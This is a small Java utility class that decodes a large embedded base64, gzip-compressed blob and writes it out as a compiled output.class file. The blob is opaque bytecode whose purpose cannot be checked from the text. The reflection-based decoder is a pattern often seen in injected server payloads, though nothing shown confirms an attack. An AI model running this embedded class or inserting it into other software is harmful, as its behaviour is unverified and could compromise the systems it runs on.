package com.mechoy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.zip.GZIPInputStream;

public class Test {
    public static void main(String[] args) throws Exception {
        byte[] clazzByte =  gzipDecompress(decodeBase64(getBase64String()));
        String filePath = "output.class";

        // 使用try-with-resources自动关闭流
        try (FileOutputStream fos = new FileOutputStream(filePath)) {
            fos.write(clazzByte);
            System.out.println("文件已保存至: " + filePath);
        } catch (IOException e) {
            System.err.println("写入文件时出错: ");
            e.printStackTrace();
        }
    }

    public static String getBase64String() throws IOException {
        return new String("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");
    }


    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        while (true) {
            int n = ungzip.read(buffer);
            if (n >= 0) {
                out.write(buffer, 0, n);
            } else {
                return out.toByteArray();
            }
        }
    }

    public static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        try {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception e) {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }


}
